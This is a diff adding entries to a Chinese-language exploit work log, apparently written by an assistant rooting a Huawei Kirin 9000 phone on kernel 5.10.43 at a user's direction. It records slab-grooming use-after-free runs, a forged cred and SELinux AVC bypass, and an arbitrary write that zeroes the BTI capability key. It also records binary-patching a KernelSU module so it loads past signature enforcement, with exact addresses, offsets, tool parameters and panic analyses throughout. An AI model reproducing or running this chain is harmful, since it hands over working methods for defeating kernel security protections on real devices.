+                lr = __cfi_slowpath+0x11c/0x268   = 0xffffffdf7fdcfe7c
+                x0=0x02b3a43e29242445(TypeID) x1=0xffffffdf72739b3c
+                x22=0xffffffdf72729000 x28=0xffffffdf831f8000
+    6469.604492 blackbox: set_exception_info pc/lr=0xffffffc011fa0808
+                sp=0xffffff63d1c07480 esr=0x96000007 far=0xffffffdf72728ff0
+    6469.605041 panic 时的回溯链（栈上返回地址）:
+                __cfi_check+0x0/0x7e0 [kernelsu]
+                ← do_boottime_initcall+0x250/0x2e0
+                ← do_one_initcall+0x1a4/0x478
+                ← do_init_module+0x70/0x3f0
+                ← load_module+0x3cb8/0x4b5c
+                ← __arm64_sys_init_module+0x25c/0x2a8
+                ← el0_svc_common+0xb4 ← el0_svc+0x70 ...
+    6469.605041 Kernel panic - not syncing: bad mode
+                CPU:1 PID:0 Comm: W0_CALL Tainted: G W OE 5.10.43 #1
+  静态核对（本地 kk16e_back.ko）:
+    __cfi_check：.text 偏移 0x0，size 0x7e0(2016)，首 4 字 88b596d2 a81caff2 8817dff2 c8eefff2
+                 （= movz/movk 常量装载序列，无 "bti c"(0xd503245f)）
+    init_module：.init.text 偏移 0x0，size 488，首字 fd7bbea9 = stp x29,x30,[sp,#-32]!（亦无 BTI）
+    全族 ko（base_kk/kk_4b88/kk_patched/out_vendor/kernelsu_cfb64527…）均无 .note.gnu.property，
+    __cfi_check 首字节完全一致 → 原始预编译产物即缺 BTI，不是本轮转换丢失
+  结论(a16e):
+    1) 修复版 ko 已突破 a15 的 ENOENT：符号解析通过，模块被内核接受并完成装载
+       （module_layout 无版本、签名缺失均只 taint），HISEC mod-sign=-61 未阻断；
+    2) 首次失败点从“装载前”前移到“模块 initcall 间接调用”：
+       内核 CFI(__cfi_slowpath) 因 TypeID 不匹配进入模块 __cfi_check，
+       而模块 .text 入口缺 BTI 着陆垫 → BTI bad mode → panic；
+    3) 说明本次全链（B13/GATE/reap/stage1/伪 cred/AVC 放行）均成功走过，
+       否则不会出现 load_module→do_init_module 的调用栈；但 B13 具体数值随 panic 丢日志未能取证；
+    4) 模块仍是为 cfb64527 内核构建的预编译产物（make_kgid 缺失、TypeID 不匹配），
+       需针对本内核重建（匹配 CFI TypeID + BTI + vermagic/符号）才能真正 init 成功。
+  跟进方向(a17 候选):
+    A. 取设备 /proc/config.gz → 用 workspace 内核源重建 KernelSU 外部模块（-mbranch-protection=standard，
+       与内核同 CFI/vermagic），再按同流程开枪；
+    B. 不重建：在 wr93 已有的任意写原语上补一步，运行期绕开 CFI/BTI（需定位可安全改写的调用点/页属性）；
+    C. 核对设备 CPU Features 是否含 bti、以及内核是否强制模块 BTI，再定 A/B。
+
+[a17 分析记录] 2026-11-05 20:30~20:45（只做取证/静态分析，未开枪，未重启）
+  设备状态: boot#4 aa6a5450-9985-4a58-9fa7-5eee6744e888
+            首次检查 uptime=93.90s；记录时 uptime=1317.91s（idle 5501.35）
+  内核配置（/proc/config.gz 实测，已存 D:\98260\logs\config_boot3.txt）:
+    CONFIG_ARM64_PTR_AUTH=y  CONFIG_ARM64_PTR_AUTH_KERNEL=y
+    CONFIG_ARM64_BTI=y       CONFIG_ARM64_BTI_KERNEL=y
+    CONFIG_RANDOMIZE_BASE=y
+    CONFIG_CFI_CLANG=y       CONFIG_CFI_CLANG_SHADOW=y
+    # CONFIG_CFI_PERMISSIVE is not set
+    CONFIG_MODULE_UNLOAD=y   CONFIG_MODVERSIONS=y
+    CONFIG_MODULE_SIG=y      CONFIG_MODULE_SIG_FORCE=y
+  CPU Features（/proc/cpuinfo 首行，尾部）: ... dgh bti   ← 硬件支持 BTI
+  设备无任何可加载模块:
+    /vendor/lib/modules 不存在；find /vendor /system -name "*.ko" 结果为空
+    → 本机从未加载过外部模块，无可参考的 BTI 合规模块
+  内核镜像:
+    D:\98260\kernel.raw 为 arm64 Image（0x38 处 magic "ARM\x64"，text_offset=0）
+      → 链接地址 0xffffffc010000000 对应文件偏移 0x0
+    D:\98260\kernel.bin 为带头部封装（非标准 Image），未用作反汇编基准
+    工作区 kernel-src 与 android_kernel_huawei_k9000_HM2-full 均为 4.14.116，
+    与设备 5.10.43 不匹配 → 不能用源码重建模块
+  符号/反汇编（kallsyms 5.10.43 包 + kernel.raw）:
+    module_alloc          = 0xffffffc0100f7244（file 0xf7244）
+      disasm: mov x21,#0x703 ; movk x21,#0xe8,lsl#48 ; cmp w9,#0 ; orr x11,x21,#0x800
+              csel x5,x21,x11,eq  → prot(x5)=0xE800000000000703
+    全镜像扫描 movz #0x703 + movk lsl#48 组合: 410 处为 0xE8，1 处为 0xC8
+      0xC8 = 0xE8 & ~0x20000000000000（bit53=PTE_PXN）→ PAGE_KERNEL=0xE8…0703
+      即本内核 PAGE_KERNEL 不含 bit50（若 mainline 定义 PTE_GP=1<<50，则模块页“未守卫”）
+      与实测 BTI 异常矛盾 → GP 位定义需另行确认（候选 bit50 / bit51）
+    bti_enable            = 0xffffffc0100ef8c8
+      mrs x9,sctlr_el1 ; orr x8,x9,#0x1800000000 ; msr sctlr_el1,x8 → 置 BT0/BT1（EL1+EL0 BTI 开启）
+    do_bti                = 0xffffffc0100e8a18
+      ldrb w8,[x0,#0x108] ; tst w8,#0xf ; b.ne → brk #0x800；
+      正常路径 mov w0,#4 ; mov w1,#1(or #2) ; bl 0xffffffc0100e8404
+    __cfi_slowpath       = 0xffffffc01034fd60（由 pstore lr 0xffffffdf7fdcfe7c 反推：+0x11c）
+    （其余记录于 a16e 段的 lr/pc 数值均由 pstore 实测）
+  a16e 崩溃寄存器复核（来自 pstore dmesg）:
+    x20 = 0x02b3a43e29242445 = 被检查的 TypeID
+    x19/x1 = 0xffffffdf72739b3c = 模块 core base(0xffffffdf72729000) + 0x10b3c
+    x22 = 0xffffffdf72729000 = 模块 __cfi_check（= cfi_check 指针，页对齐）
+    结论: 内核要调用的目标不是 init_module 本体，而是 modules 的 CFI 跳表桩:
+      0x10b3c = 符号 kernelsu_init.cfi_jt（st_size=4，文件字节 00000014 = b .）
+      运行时由重定位改成 b kernelsu_init；该桩 4B 已被 b 占满，且入口无 bti c
+      → 二进制层面无法在不重排 .cfi_jt 的前提下补 BTI（kernelsu_init/init_module 本体亦无 bti）
+
+    __cfi_check 在 .text+0，首 4 字 88b596d2 a81caff2 8817dff2 c8eefff2（movz/movk 常量序列，无 bti c）
+    .cfi_jt 桩连续排列(0x10b3c 起每个 4B "b .")，说明模块确为 old-CFI 产物（有 cfi_jt 机制）
+  本轮结论:
+    1) 内核强制 BTI（CONFIG_ARM64_BTI_KERNEL=y + CPU bti + bti_enable 置 BT0/BT1）；
+    2) 预编译 ko 为 old-CFI 产物但缺 BTI 着陆垫，首个间接跳转(__cfi_check)即 panic；
+    3) 模块页 GP 位是否置位与 PAGE_KERNEL 常量矛盾（0xE8 不含 bit50），
+       需实证确认 GP 位（bit50/bit51）后才能决定“运行期去守卫”是否可行；
+    4) 重建路径缺 5.10.43 源码与构建设施（工作区只有 4.14.116 源码、无 Module.symvers/.config 产物、
+       无 WSL/Linux 构建环境）→ 待用户提供 5.10.43 源码仓库后再评估。
+  下一步(a17):
+    0. 按用户要求核查 GitHub zfgysyuef 的 4 个 huawei 项目，确认哪个是 5.10.43（用户已给 URL）；
+    1. 若拿到 5.10.43 源码：优先重建 KernelSU 外部模块（-mbranch-protection=standard + 与内核同 CFI/vermagic）；
+    2. 若暂不重建：用 wr93 的任意写原语在开枪前改 module_alloc 的 movk 立即数
+       (link 0xffffffc0100f72a4，imm 0xe8；候选改 0xe0=清bit51 / 0xe4=清bit50) 做 GP 位实证，
+       每次仅改一个位，panic 即记下并换另一候选；
+    3. 注意: 每次改动后开枪仍可能 panic 重启，重启授权与数值落盘规则照旧。
+
+
+[汇总索引] 2026-11-05（本文件内各枪定位 + 原始日志对照）
+  说明: “行号”指本文件内该段的起止行（随编辑可能小幅漂移，以段标题为准）；“堆载”= 是否走到 load_module/init_module
+  ┌─────────┬──────────────┬──────────────────┬─────────────────┬────────┬──────────────┬─────────────────────────────────────┐
+  │ 批次    │ 时间         │ boot_id(前8)     │ slide           │ GATE   │ 堆载/结果    │ 原始日志/证据                        │
+  ├─────────┼──────────────┼──────────────────┼─────────────────┼────────┼──────────────┼─────────────────────────────────────┤
+  │ a9      │ 16:45        │ —                │ 0x28c4280000*   │ —      │ 无日志       │ a9.log 全 NUL（内容丢失）             │
+  │ a10     │ 16:50        │ —                │ 0x28c4280000*   │ —      │ 崩(PLT)      │ pstore_a10_console.txt               │
+  │ a11     │ 17:22        │ —                │ 0x2879880000    │ —      │ 崩(reloc)    │ pstore_a11_console.txt               │
+  │ a12     │ 17:30        │ —                │ 0x13a4e80000    │ PASS   │ stage1 失败  │ a12.stream.log                       │
+  │ a13     │ 17:36/17:38  │ —                │ 0x18d9480000    │ PASS   │ 崩(avc NULL) │ a13.recovered.log + pstore_a13_console.txt │
+  │ a14-1   │ 18:09        │ —                │ 0x18b5c80000    │ 拒×2   │ 未开枪       │ a14.stream.log                       │
+  │ a14-2   │ 18:12        │ 同一 boot        │ 0x18b5c80000    │ 拒×2   │ 未开枪       │ a14b.stream.log                      │
+  │ a14-3   │ 18:14        │ fresh            │ 0x1182480000    │ 拒×2   │ 未开枪       │ a14c.stream.log                      │
+  │ a14-4   │ 18:16        │ 同一 boot        │ 0x1182480000    │ 拒×4   │ 未开枪       │ a14d.stream.log                      │
+  │ a14-5   │ 18:26        │ fresh(≈115s)     │ 0x2093e80000    │ PASS   │ 首次到 init_module 返回(rc 未采) │ a14e.stream.log │
+  │ a16a    │ 19:39        │ 9260ceb3         │ 0x2584280000    │ 拒(脏) │ 未开枪       │ 记录第 243~315 行段（a16 三段合一）  │
+  │ a16b    │ 同上         │ 同上             │ 0x2584280000    │ —      │ 设备自重启   │ 同上                                 │
+  │ a16c    │ 同上         │ 新 boot          │ 0x2320e80000    │ 拒×2   │ 未开枪       │ a16c 段                             │
+  │ a16d    │ 20:0x        │ 同上             │ 0x2320e80000    │ PASS但 │ GATE_REJECT  │ a16d.stream.log                      │
+  │         │              │                  │                 │ round=1│ (不进 reap)  │                                     │
+  │ a15     │ 19:xx        │ —                │ 0x29ca280000    │ PASS   │ 到 init_module 返回 rc=-1 errno=2(ENOENT) │ a15.stream.log │
+  │ a16e    │ 20:12~20:26  │ eaa126b9         │ 0x1f6fa80000    │ PASS   │ 模块已装载，卡 CFI/BTI panic │ a16e.stream.log(0B) + pstore_a16e_dmesg/console(.clean).txt │
+  └─────────┴──────────────┴──────────────────┴─────────────────┴────────┴──────────────┴─────────────────────────────────────┘
+  注*: a9/a10 的 slide 来自事后核算，a10 实际烘焙值为 0x278f900000（与真实 slide 偏差约 4.5GB）
+  关键结论索引:
+    - 首次全链走通: a14-5（段“a14-5”，pprev 修复生效）
+    - 首次拿到 rc/errno: a15（rc=-1 errno=2 ENOENT，根因 make_kgid）
+    - 首次被内核真正装载: a16e（module verification failed 仅 taint、HISEC mod-sign=-61 未阻断；
+      卡点=模块 __cfi_check/kernelsu_init.cfi_jt 缺 BTI，panic 见 “a16e 执行”段）
+    - 待办: a17（见“a17 分析记录”段；核心=确认 GP 位或重建 5.10.43 模块）
+  日志目录: D:\98260\logs\（*.stream.log / pstore_* / config_boot3.txt / kk16e_back.ko / kk16e.b64）
+  附: a16e 的设备端 a16e.log(3579B) 与 a16d 的设备端日志均被 panic 清零，属已知现象；
+      实时 stream 因 stdout 未 flush 亦为 0B，故 a16e 的数值全部来自 pstore 原文。
+
+
+[a17-0 GitHub 核查] 2026-11-05 20:5x（主机侧联网核查，未动设备）
+  来源: https://github.com/zfgysyuef?tab=repositories&q=huawei
+  方法: GitHub API 被限流(403 rate limit)，改用仓库列表页 HTML 提取仓库名 +
+        raw.githubusercontent.com/<repo>/HEAD/Makefile 读取版本号
+  4 个 huawei 仓库实测:
+    1) android_kernel_huawei_960_Emui9.0           VERSION=4 PATCHLEVEL=9  SUBLEVEL=111  → 4.9.111
+    2) android_kernel_huawei_k9000_HM2              根 Makefile 404（工作区副本为 4.14.116）
+    3) android_kernel_huawei_kirin710_KernelSU      VERSION=4 PATCHLEVEL=9  SUBLEVEL=148  → 4.9.148
+    4) android_kernel_huawei_kirin9000              VERSION=5 PATCHLEVEL=10 SUBLEVEL=43   → 5.10.43 ★
+       默认分支 main（commits/main）
+  结论: 只有 android_kernel_huawei_kirin9000 与本机 5.10.43 一致，是本轮重建所需源码库。
+  仍需核对（clone 后）:
+    a) 是否同一厂商树: 检出 hkip_hhee / HISEC mod-sign / CFI/BTI 相关实现与设备 dmesg 字符串吻合；
+    b) 设备内核 version string 仅 "5.10.43"，无 localversion；需确认 config 与本机
+       CONFIG_ARM64_BTI_KERNEL=y / CFI_CLANG=y / MODVERSIONS=y / MODULE_SIG_FORCE=y 一致；
+    c) 外部模块编译依赖该树自身的构建产物（Module.symvers、同 config 的 vmlinux），
+       仅 clone 源码不足以产出可加载 kk.ko → 需先完整构建内核（交叉工具链 + 时间/磁盘）。
+  a17 路线更新:
+    A 路线（重建）可行源码 = kirin9000(main)；
+    B 路线（运行期改 module_alloc 的 movk imm 0xe8）仍可先行做 GP 位实证，成本更低。
+
+[a17 静态复核-2] 2026-11-05 21:0x  —— B 路线靶点修正（重要）
+  先前假设“GP 由 module_alloc 的 PAGE_KERNEL 常量决定”是错的，实测链路:
+    module_enable_x → set_memory_x(link 0xffffffc01018410c)：
+      0x184124 bl 0xffffffc01113dfc0（读 arm64_const_caps_ready）
+      0x184130 ldar w8,[arm64_const_caps_ready] ; cmp #1 ; b.lt → mask=0
+      0x184144 ldar w8,[0xffffffc0137fc660] ; cmp #0 ; cset gt
+      0x184154 mov x8,#0x4000000000000 (PTE_GP=bit50)
+      0x184158 csel x2,x8,xzr,ne → set_mask=GP 或 0
+      0x18415c mov x3,#0x20000000000000 (清 PTE_PXN)
+      0x184168 bl change_memory_common
+  → module text 的 GP 是 set_memory_x 在装载时后加的，不是 module_alloc 的 prot
+  数据定位:
+    CONFIG_JUMP_LABEL **未设置**（config_boot3.txt），因此 cpus_have_const_cap 是运行时 ldar
+    cpu_hwcap_keys 符号 0xffffffc0137fc588；static_key_false 大小 4B；
+    +0xd8 → 0xffffffc0137fc660 = cpu_hwcap_keys[54]；cpucaps.h 中 ARM64_BTI=54 ✓
+    arm64_const_caps_ready = 0xffffffc0137fc6bc（须保持 ≥1）
+  结论: 只写这一处**可写 BSS 数据**（4B=0）即可让 set_memory_x 传 set_mask=0，
+        模块页不再标 GP → 无 BTI 着陆垫的模块可被间接调用（内核自身 text 的 GP 在
+        mmu.c 启动时已写死，不受影响）。无需改内核代码（避开 STRICT_KERNEL_RWX）。
+  另: 上游 v5.10 的 PAGE_KERNEL 常量 0xE8…0703 = DEVMEM(55)|UXN(54)|PXN(53)|DBM(51)+AF/SH；
+      PTE_GP=bit50；该 vendor 树 pgtable-prot.h 与上游一致（PAGE_KERNEL 不含 GP）。
+
+[a17-1 执行] 2026-11-05 21:12~21:16  boot aa6a5450（uptime 2787s，slabdata=6）
+  slide: raw_values=3 hits=3 slide=0x1aa2880000 base=0xffffffdab2880000
+  ko: kk17.ko = kk_4b88_fixkgid.ko(da52279a…) → kodelta 0x22f9c80000→0x1aa2880000
+      patched=188 delta=0xfffffff7a8c00000；烘后 md5 47d86cb932de36780ff423080fcad668
+      回传 scan: bad=0 abs_min=0xffffffdab2887a6c ✓；ck_ko: make_kgid SHN_ABS/0、type0@0x827c sym1069、UR=1 不含 make_kgid
+  wr93_pprev5 = wr1.c + ④d BTI 数据开关；NDK r27c clang -O2 -static
+      md5 5ac5eb1bfd050dd02a5449836df6d556 size 2349352（设备一致）
+  运行（日志 D:\98260\logs\a17.snapshot1.log / a17.stream2.log）:
+    victim=28769 tid=28770 timers=631 holes=0 recs=631 slabs=22 last_slab=3022116
+    满30=20；前8组 29:1572068 30:1465388 30:1465390 30:1488864 30:1488866 30:1488868 30:1488870 30:1488872
+    arm_i=58 addr=0xffffff8165c2ded0；slab pfn=1465388 cnt=30 → target pfn=1465389
+    [B7] 960 960 272 30 2 slabdata 32 | [B8] zombie 90649us reads=63 opens=127919
+    [B12F] 伪 cred 0xffffff8165c2d100 tsec +0xc0；[B12A] avc_node +0x1f0
+    [B12I] P=…d400 Pnode=+0x18 Q=…d580 F=…d640 misc_list=0xffffffdab5dc7860
+    [B13] round1: free(n=0 mt=-1) alloc(pfn=1465389 n=1 mine=1 mine_unmov=1 mt=0 ord=0) cum_free=0
+    [B15] GATE=PASS 但 alloc_round=1 free_cnt=0 → GATE_REJECT，未进 reap，未到 [A17]
+    随后父进程驻留（sigsuspend），10 个 wr93 进程挂起
+  事故: 用 pkill -9 wr93_pprev5 清理驻留进程 → 设备 panic/重启（清理即重启，务必记住）
+        新 boot c55faa80-90c5-4b8e-ba74-f512d7de0ab2，重启后 uptime≈91s
+  教训: GATE_REJECT 后的驻留进程不要 kill（会触发重启）；直接等用户授权再 reboot
+  下一步(a17-2): fresh boot 等待 uptime≥300 → InvokeRoot/tracing/kaslr → 重烘 ko → 用
+        wr93_pprev5 再打一枪；重点是日志中的 [A17] bti key <- 0 rc 与 init_module 的 rc/errno
+
+================================================================================
+[a17e/a17f/a17g/a17h 执行记录 + 两个根因]
+================================================================================
+[a17e] boot 6eeaee37 uptime≈878s，slide=0x27bb400000 base=0xffffffe7cb400000
+  wr93_pprev8 md5=aff85239d1d51d9c6ce7cbda56d9bc91 / kk17d.ko md5=b8d1f1797ced2db7b23a27cec4acb779
+  [B0c] cred_cs=0xffffffe7cb5e38d4 timer_cs=0xffffffe7cb...f748 task_cs=0xffffffe7cb...30a8
+  [B1] cred records=2 / probe_task records=1 ✓  [B2] victim timers=631 holes=0 recs=631 slabs=22
+  [B13] round1..4，round4 alloc(node pfn=8495635 n=1 mine=1 mine_unmov=1 mt=0 order=0)，free_cnt=2
+  [B15] GATE=PASS  [B16/B17] reap done status=0x9  [B19] stage1 rc=0
+  [F] sid=68 -> u:r:init:s0；real_cred/cred=0xffffff881a213100；pid/tgid(0x878)<-0；avc 全 rc=0
+  [A17] const_caps_ready 0xffffffe7cebfc6bc <-1 rc=0 | bti key 0xffffffe7cebfc660 <-0 rc=0
+  [F] probe comm='W0_CALL' state=R（已进 init_module）→ 随后断连 panic/重启
+  判定(pstore): pc=sve_get+0x1cc/0x2f4 lr=kernelsu_init+0x44/0x1e8 [kernelsu] code 0x36000001 BTI
+  → 结论: 模块入口 BTI 已通，真正进入 kernelsu_init；崩在 bl prepare_creds 落点错误
+
+[根因-1] kodelta 烘焙 old_slide 错 0x80000
+  原始 ko ABS 实际基于 base=0xffffffe309c00000（slide 0x22f9c00000）
+  证据: printk ABS=0xffffffe309e67c98 ↔ link 0xffffffc010267c98
+        prepare_creds ABS=0xffffffe309de38ac ↔ link 0xffffffc0101e38ac
+  旧参数 old=0x22f9c80000（多 0x80000）→ 188 个 ABS 地址整体低 0x80000
+  实测落点 0xffffffe7cb5638ac = 真值 0xffffffe7cb5e38ac - 0x80000 = sve_get+0x1cc
+  修复: old=0x22f9c00000；本地 bake_ko.py 烘焙 kk17f.ko（baked=188）
+
+[a17f] boot 49397d22，slide=0x1009000000 base=0xffffffd019000000
+  修复版 ko kk17f.ko；B1 recs=0 → 失败（relay/tracing 未就绪，kmem 事件 enable=0）
+
+[a17g] 同一 boot：拉起 relay(am instrument --user 15 com.root.adbinvoke/.InvokeRoot, id=uid0 u:r:init:s0)
+  重新开火 → 模块成功加载并运行
+  判定(pstore): kernelsu: no symbol version / taint；Modules linked in: kernelsu(OE+)
+  panic: pc=ksu_patch_text_cb+0x60/0x204 [kernelsu] (顺带 lr=multi_cpu_stop+0x140/…)
+         Unable to handle NULL pointer deref at virtual address 0000000000000a00
+  反汇编: ksu_patch_text_cb+0x60 = ldr x8,[x8] (reloc init_mm+0x48 → x8=pgd)
+          x9=pgd_index(addr)=0x140 → 0xa00；实际 [init_mm+0x48]=0（该内核此偏移非 pgd）
+[根因-2] mm_struct.pgd 偏移 = 0x58（非 GKI 的 0x48）
+  证据: __apply_to_page_range(0xffffffc010485298): ldr x8,[x28,#0x58] + ubfx pgd_index
+  模块 phys_from_virt / ksu_patch_text_cb 两函数共 4 条 reloc init_mm+0x48 需改 0x58
+  修复: patch_mm.py 改 4 条 rela addend 0x48->0x58，生成 kk4b88_pgd58.ko
+        + bake_ko.py(old=0x22f9c00000,new=本boot slide) → kk17h.ko
+        校验 init_mm=base+0x35511e0 / prepare_creds=base+0x1e38ac / printk=base+0x267c98 ✓
+
+[a17h] boot 6e9c4dbe，slide=0x1cd7c00000 base=0xffffffdce7c00000
+  kk17h.ko（pgd58 版）；relay 就绪；slabinfo pre-go posix_timers_cache 930/930 slabdata 31
+  [B1] recs=2 ✓  [B2] victim=17724 timers=631 holes=0 recs=632 slabs=22 last_slab=3378912
+  [B2b] slab pfn=3136736 cnt=30 arm_i=58 node=0xffffff82fdce1f58 off=0xf58
+  [B12F] 伪 cred @ page+0x100 / avc_node @ page+0x1f0 / misc_list=0xffffffdceb1c7860
+  [B13] round1: pipe pages=2048 in 153670us, free(n=1) alloc(pfn=3136737 n=1 mine=1 mine_unmov=1 mt=0 ord=0)
+  [B15] GATE=PASS 但 alloc_round=1 free_cnt=1 (<2/<2) → GATE_REJECT
+  随后主进程+2 个填充器(17722/17723) 互相等待挂起，无法进入 attempt 2（日志 62 行停滞）
+  处置: 经用户同意，adb reboot（禁止 kill 驻留进程）
+
+[a17i] boot 79868f31，slide=0x2aa4000000 base=0xffffffeab4000000
+  kk17i.ko md5=ec4d268a97028b59cbafd5d8a2515bbd（kk4b88_pgd58 + bake old=0x22f9c00000 new=0x2aa4000000）
+  校验: printk=0xffffffeab4267c98 / prepare_creds=0xffffffeab41e38ac / init_mm=0xffffffeab75511e0 ✓
+  开火前 slabinfo: posix_timers_cache 180/180 slabdata 6
+  [B1] recs=2 ✓  [B2] victim=17505 timers=631 holes=0 recs=631 slabs=22 last_slab=3146446
+  attempt1: [B2b] slab pfn=8498594 cnt=30 arm_i=58；[B7] 930/930 slabdata 31
+            [B8] zombie=Z comm='exe' in 95975us | det+26us kill+647us → MISS(exec 正常完成)
+  attempt2: [B2h] 填充器 17594 造 149 timer；[B2] victim=17595 last_slab=8509212 recs=631
+            [B7] 1080/1080 slabdata 36 → slabdata 闸(>33) 弃用
+  VERDICT: 2 次尝试全部未拿到；进程驻留(17467 系)
+
+[a17j] 同 boot 直接再打，slide 不变
+  [B2e] recs=644 okc=631 多=13 非满组=1 | alias 组: 31:4050014 31:3007192 31:3007194 31:3007198
+        31:1478032 31:1478034 31:1478036 31:1477656
+  [-] 几何脏 (recs=644/631 满30=8/22 arm_i=29 alias=13) → 弃用；VERDICT 2 次全失败
+  原因: 前一枪残留 timer 污染泄漏记录，slab 越打越脏
+  处置: 经用户同意，adb reboot 清场后再打
+================================================================================
+
+[a18 执行记录] 2026-11-05 22:5x~23:3x（同 boot 连打 3 轮，全部被 slabdata 闸拦，未 panic）
+  boot_id: fc6414b1-59c2-46f2-ab06-ffee51699b8b
+  slide=0x14aa200000  base=0xffffffd4ba200000（kaslr_self raw_values=3 hits=3）
+  内核侧修正（相对模块 ABI 假设）:
+    task_struct: tasks=0x768 signal=0xa90 thread_node=0x938 thread_group=0x928
+                 pid=0x878 mm=0x7b8 real_cred=0xa40 cred=0xa48 comm=0xa58 state=0x18
+    signal_struct.thread_head=+0x10（模块一致）；cred.security=0x78 / cred.uid=+4（模块一致）
+    金丝雀：内核用全局 __stack_chk_guard（非 sp_el0），模块 144 处 ldr [#0x730] 全改为 [#0x878](pid)
+  产物:
+    kk18_base.ko  md5 e63a2def5cbbd0fbe81eb3275abd6e7f（9 条 task 偏移补丁）
+    kk18_base2.ko md5 20e908d47dd85f62e1153d766e3263f8（+144 条金丝雀补丁）
+    kk18l.ko      md5 0651ad0993d70f7254fee1339900a1e5（bake slide=0x14aa200000, baked=188）
+    烘焙校验: prepare_creds=0xffffffd4ba3e38ac printk=0xffffffd4ba467c98 init_mm=0xffffffd4bd7511e0
+  开火参数（wr93_pprev8）: -I -U FCIMP -m kk18l.ko -t -W -s 0x14aa200000 -n 631 -p 60 -g 8 -y 1200 -a 2
+  第 1 轮（同 boot 基线 slabdata≈6）:
+    attempt1 [B2] victim=26132 tid=26133 timers=631 holes=0 | recs=631 slabs=22
+             [B7] 990 990 272 30 2 slabdata 33（闸门临界通过）
+             [B8] go+622us det+33us kill+655us → MISS（kill 落点未进 de_thread 窗口）
+    attempt2 [B7] slabdata=38 > 33 → 闸门弃用
+    VERDICT: 2 次尝试全部未拿到（无 panic，uptime 连续）
+  第 2 轮（同一 boot，残留 timer 已把基线抬高）:
+    attempt1 [B2] victim=28474 tid=28475 timers=631 holes=0 recs=631 slabs=22 last_slab=3055592
+             [B2d] groups=22 满30=20；前8组 29:2994886 30:8718716 30:8718718 30:8489028 ...
+             [B2a] arm_i=58 addr=0xffffff885097ded0
+             [B2b] pfn=8718716 cnt=30 head=8718716 目标页=8718717
+             [B7] 1290 1290 272 30 2 slabdata 43 → 闸门弃用
+    attempt2 [B2] victim=28499 tid=28500 last_slab=8625650
+             [B7] 1440 1440 272 30 2 slabdata 48 → 闸门弃用
+    VERDICT: 2 次尝试全部未拿到
+  第 3 轮（开火前实测 slabinfo 810/930 slabdata 31，误判可过闸）:
+    attempt1 [B2] victim=29172 tid=29173 timers=631 holes=0 recs=631 slabs=22 last_slab=3022596
+             [B2h] filler 116 + 29 个 timer
+             [B2d] groups=22 满30=20；29:8625650 30:8736718 30:3014698 30:3015964 30:3015966 ...
+             [B2a] arm_i=58 addr=0xffffff8854fcfed0
+             [B2b] pfn=8736718 cnt=30 head=8736718 目标页=8736719
+             [B7] 1590 1590 272 30 2 slabdata 53 → 闸门弃用
+    attempt2 [B2] victim=29196 tid=29197 last_slab=2995062；[B2h] filler 149
+             [B2a] arm_i=29 addr=0xffffff82e1f05ed0；[B2b] pfn=3022596 目标页=3022597
+             [B7] 1740 1740 272 30 2 slabdata 58 → 闸门弃用
+    VERDICT: 2 次尝试全部未拿到（uptime 2589→2728s 连续，无 panic）
+  收尾实测: posix_timers_cache 1110/1230 slabdata 41；驻留 wr93_pprev8 线程数=33
+  结论: 同 boot 内每次 victim 631 timer 必然把 slabdata 抬高 ~5（filler 再 +2~5），基线一旦 >33 即被闸门锁死；
+        按既有约定「一 boot 一枪」，需重启复位 slabdata（禁用 kill 残留进程，清理只能靠重启）
+
+[a18 第4轮 + panic 取证] 2026-11-05 23:3x~23:50（经用户批准重启后开火，命中窗口后 panic）
+  重启: boot fc6414b1 → 7ac01fb7-33da-48cc-9009-2b118dba7382（uptime 304s，slabdata=6）
+  slide=0x2b6d400000 base=0xffffffeb7d400000（raw_values=3 hits=3）
+  烘焙: kk18l.ko 0x14aa200000→0x2b6d400000 patched=188 delta=0x16c3200000
+        设备侧 md5=7bac589b283da7f08c520baa49e1041d
+  开火: attempt1 [B2h] filler 145+29 | [B2] victim=16252 tid=16253 timers=631 holes=0 recs=631
+        slabs=22 last_slab=3060434 | [B7] 960 960 272 30 2 slabdata 32
+        [K] de_thread comm='timer-exec' 距 go 522us | [B8] go+467us det+55us kill+522us
+        zombie in 154311us | ku=-1 | reads=64 opens=92348 err=0
+        == WINDOW HIT (attempt 1)
+        [B8b] slabinfo(at-hit) 960 960 272 30 2 slabdata 32
+        [B12F] 伪 cred @0xffffff82eb205100 tsec @0xffffff82eb2051c0
+        [B12A] 伪 avc_node @0xffffff82eb2051f0
+        [B12T] 整页自洽 slots=10 skip=5
+        [B12I] off=0xf58 aux=0x400 P=0xffffff82eb205400 Pnode=0xffffff82eb205418
+                Q=0xffffff82eb205580 F=0xffffff82eb205640 misc_list=0xffffffeb809c7860
+        [B12c] pipe#0 F_SETPIPE_SZ(1MB) ret=1048576 F_GETPIPE_SZ=1048576 | pipes=60
+        [B13] round1 pipe pages=2048(total 2048) in 153167us
+              free(n=2 mt=-1) alloc(node pfn=3060229 n=0 mine=0 mine_unmov=0 mt=-1 order=-1) cum_free=2
+              trace mm_page_free pfn=3060228 order=1 @489.597958s / @489.923459s
+        [B13] round2 pipe pages=2048(total 4096) in 150170us
+              free(n=0 mt=-1) → 本轮目标页没被分配
+  内核 panic（pstore，约 495.02s）:
+    Modules linked in: kernelsu(OE+)  ← 模块已加载
+    Call trace: kernelsu_init+0x164/0x1e8 → ksu_observer_init+0xe4/0x144
+                → fsnotify_add_mark_locked+0x170/0x67c → _raw_spin_lock+0xdc/0x108
+                → spin_bug+0xc8/0xdc → dump_stack_lvl+0xb8/0x114
+    Unable to handle kernel write to read-only memory at ffffffeb8006968a
+    ESR=0x9600004e EC=0x25 DABT IL=32 CM=0 WnR=1 | far=0xffffffeb8006968a
+    pc: queued_spin_lock_slowpath+0x1b0/0x4b0 = 0xffffffeb7d4ad0a8（link 0xffffffc01002d0a8）
+    lr: queued_spin_lock_slowpath+0x1c/0x4b0  = 0xffffffeb7d4acf14（link 0xffffffc01002cf14）
+    Code: 91000a6c 53107d4d f9800191 485f7d8e (480f7d8d)  ← stlxp 写 rodata
+    故障锁地址 link = 0xffffffc012c69688，落在 rodata（紧邻 default_v_ops=0xffffffc012c69668）
+  结论: task_struct 9 处偏移 + 144 处金丝雀补丁已生效，ksu_mark_running_process_locked 关通过；
+        下一崩点为 ksu_observer_init 的 fsnotify 路径：模块 fsnotify_mark/group ABI 与本内核不一致
+        （kzalloc 仅 0x48 字节、调用点传 inode+0x248、锁对象解析成 rodata 指针）
+  处置: 生成 kk18s.ko = kk18_base2 + ksu_observer_init 入口改写 mov w0,#0; ret
+        md5=5f2e5a61201957ad2e8671d8b1d550a4（未烘焙）
